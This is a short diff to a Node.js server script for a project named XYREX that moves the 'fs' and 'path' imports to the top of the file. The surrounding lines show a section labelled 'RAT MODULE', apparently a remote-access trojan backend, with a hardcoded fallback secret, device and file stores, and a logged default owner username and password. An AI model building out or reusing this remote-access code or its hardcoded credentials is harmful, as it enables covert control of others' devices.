@@ -1,11 +1,13 @@
+const fs = require('fs');
+const path = require('path');
 const express = require('express');
 const http = require('http');
 const https = require('https');
 const { Server } = require('socket.io');
-const path = require('path');
+
 const QRCode = require('qrcode');
 const pino = require('pino');
-const fs = require('fs');
+
 const crypto = require('crypto');
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -396,8 +398,8 @@ server.listen(3000, () => {
   console.log('[XYREX] Owner default: Dlizz / 20111608');
 });
 // ===== RAT MODULE =====
-const fs = require('fs');
-const path = require('path');
+
+
 const RAT_SECRET = process.env.RAT_SECRET || 'xyrex-rat-20111608';
 const RAT_DEVICES_FILE = './rat_devices.json';
 const RAT_FILES_DIR = './rat_files';
